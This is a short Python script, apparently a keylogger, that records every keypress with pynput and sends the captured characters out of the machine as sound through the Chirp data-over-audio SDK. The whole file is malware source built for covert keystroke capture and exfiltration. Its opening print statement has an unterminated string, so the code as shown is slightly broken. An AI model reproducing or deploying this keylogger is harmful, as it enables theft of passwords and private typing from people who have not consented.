#!/usr/bin/env python3
import argparse
import sys
import time
import codecs
import queue
import threading

from pynput.keyboard import Listener
from chirpsdk import ChirpSDK, CallbackSet, CHIRP_SDK_STATE, ChirpSDKError

print ("hol up!! \n sleepp(5) There you go !!! )

# Initialise Chirp SDK
sdk = ChirpSDK()
sdk.start()

def logger(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift':
        letter = ''
    if letter == "Key.ctrl":
        letter = ''
    if letter == "Key.backspace":
        letter = ''
    if letter == "Key.up":
        letter = ''
    if letter == "Key.tab":
        letter = ''
    if letter == "Key.right":
        letter = ''   
    if letter == "Key.down":
        letter = '' 
    if letter == "Key.left":
        letter = ''
    if letter == "Key.enter":
        letter = "\n"
    
    q.put(letter)

q = queue.Queue()

def main():
    while True:
        try:
            message = q.get()
            if message != '':
                message = message.encode('utf-8')
                payload = sdk.new_payload(message)
                sdk.send(payload)
                # Process audio streams
                for i in range(4*len(message)):
                    time.sleep(0.5)
                q.task_done()
        except ChirpSDKError:
            continue


if __name__ == '__main__':
    t = threading.Thread(target=main)
    t.start()
    with Listener(on_press=logger) as l:
        l.join()
